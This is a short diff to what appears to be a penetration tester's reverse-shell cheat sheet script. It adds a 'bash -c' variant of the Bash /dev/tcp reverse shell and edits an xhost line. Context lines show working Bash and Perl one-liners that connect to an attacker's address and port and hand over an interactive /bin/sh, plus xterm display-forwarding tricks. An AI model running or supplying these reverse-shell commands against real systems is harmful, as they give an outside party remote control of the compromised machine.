@@ -21,6 +21,8 @@ set -o nounset                              # Treat unset variables as an error
 
 ## Bash
 bash -i >& /dev/tcp/$LIP/$LPORT 0>&1
+# OR
+bash -c "bash -i >& /dev/tcp/$LIP/$LPORT 0>&1"
 
 ## Perl
 perl -e 'use Socket;$i="$LIP";$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
@@ -48,4 +50,4 @@ p.waitFor()
 ## xterm
 xterm -display $LIP:1
 Xnest :1
-xhost +$IP
+xhost +$PT_IP
